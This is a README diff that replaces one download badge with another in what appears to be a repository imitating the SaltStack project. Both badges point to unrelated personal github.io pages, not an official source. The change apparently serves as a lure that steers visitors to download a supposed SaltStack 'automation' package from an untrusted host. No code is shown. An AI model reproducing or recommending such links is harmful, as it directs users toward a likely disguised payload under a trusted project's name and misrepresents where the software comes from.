@@ -4,10 +4,8 @@
   <img src="https://upload.wikimedia.org/wikipedia/commons/6/64/SaltStack_logo_blk_2k.png" alt="Project Logo"/>
 </div>
 
-<div align="center">
-  
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://saltstack-automation-manager.github.io/.github/)
-</div>
+[![GET SaltStack Automation](https://img.shields.io/badge/GET%20%E2%80%94%20SaltStack-Automation-0078D6?style=for-the-badge&logoColor=white)](https://aleximfe50536.github.io/.github/SaltStack-Automation)
+
 
 ---
 
